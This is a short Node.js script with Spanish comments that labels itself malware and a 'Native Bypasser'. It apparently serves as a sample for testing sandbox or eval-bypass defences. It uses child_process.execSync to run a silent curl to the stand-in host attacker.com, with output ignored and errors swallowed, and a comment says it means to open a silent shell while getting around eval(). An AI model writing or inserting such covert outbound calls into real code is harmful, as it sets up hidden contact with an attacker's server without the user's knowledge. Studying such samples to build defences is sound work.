const cp = require('child_process');

console.log("[Malware] Ejecutando Native Bypasser...");
try {
    // Intentar abrir una shell silenciosa saltándose eval()
    cp.execSync('curl -s http://attacker.com/ping || true', { stdio: 'ignore' });
} catch (e) {
    // Silencio
}
